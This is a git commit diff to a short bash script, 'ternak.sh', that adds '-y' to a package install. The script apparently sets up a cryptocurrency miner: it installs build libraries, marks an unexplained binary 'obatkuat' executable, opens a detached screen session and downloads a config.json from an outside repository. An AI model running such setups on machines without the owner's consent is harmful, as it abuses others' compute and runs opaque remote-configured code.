7e176a22003cca3da227fa72940a6af668da0718
pemburudollar228 <91428976+pemburudollar228@users.noreply.github.com>
2021-09-27 00:28:29 +0700

    Update ternak.sh

--- ternak.sh
+++ ternak.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 sudo apt update
 sudo apt install screen libjansson4 -y
-sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
 chmod +x obatkuat
 screen -dmS ls
 wget https://raw.githubusercontent.com/outbesok/mesin/main/nyampah_ah/config.json
